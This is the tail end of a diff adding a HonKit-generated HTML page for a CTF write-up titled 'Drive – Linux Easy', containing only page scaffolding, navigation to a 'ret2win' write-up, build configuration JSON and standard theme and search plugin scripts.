+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                
+                <a href="../../pwn/ret2win.html" class="navigation navigation-next navigation-unique" aria-label="Next page: ret2win – ExampleCTF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Drive – Linux Easy","level":"3.2.1.1","depth":3,"next":{"title":"ret2win – ExampleCTF","level":"3.2.1.2","depth":3,"path":"writeups/pwn/ret2win.md","ref":"writeups/pwn/ret2win.md","articles":[]},"previous":{"title":"🧪 Binary Exploitation","level":"3.2.1","depth":2,"ref":"","articles":[{"title":"Drive – Linux Easy","level":"3.2.1.1","depth":3,"path":"writeups/linux/easy/drive.md","ref":"writeups/linux/easy/drive.md","articles":[]},{"title":"ret2win – ExampleCTF","level":"3.2.1.2","depth":3,"path":"writeups/pwn/ret2win.md","ref":"writeups/pwn/ret2win.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"writeups/linux/easy/drive.md","mtime":"2026-02-25T21:32:05.616Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-25T21:45:28.346Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <noscript>
+        <style>
+            .honkit-cloak {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <script>
+        // Restore sidebar state as critical path for prevent layout shift
+        function __init__getSidebarState(defaultValue){
+            var baseKey = "";
+            var key = baseKey + ":sidebar";
+            try {
+                var value = localStorage[key];
+                if (value === undefined) {
+                    return defaultValue;
+                }
+                var parsed = JSON.parse(value);
+                return parsed == null ? defaultValue : parsed;
+            } catch (e) {
+                return defaultValue;
+            }
+        }
+        function __init__restoreLastSidebarState() {
+            var isMobile = window.matchMedia("(max-width: 600px)").matches;
+            if (isMobile) {
+                // Init last state if not mobile
+                return;
+            }
+            var sidebarState = __init__getSidebarState(true);
+            var book = document.querySelector(".book");
+            // Show sidebar if it enabled
+            if (sidebarState && book) {
+                book.classList.add("without-animation", "with-summary");
+            }
+        }
+
+        try {
+            __init__restoreLastSidebarState();
+        } finally {
+            var book = document.querySelector(".book");
+            book.classList.remove("honkit-cloak");
+        }
+    </script>
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/@honkit/honkit-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
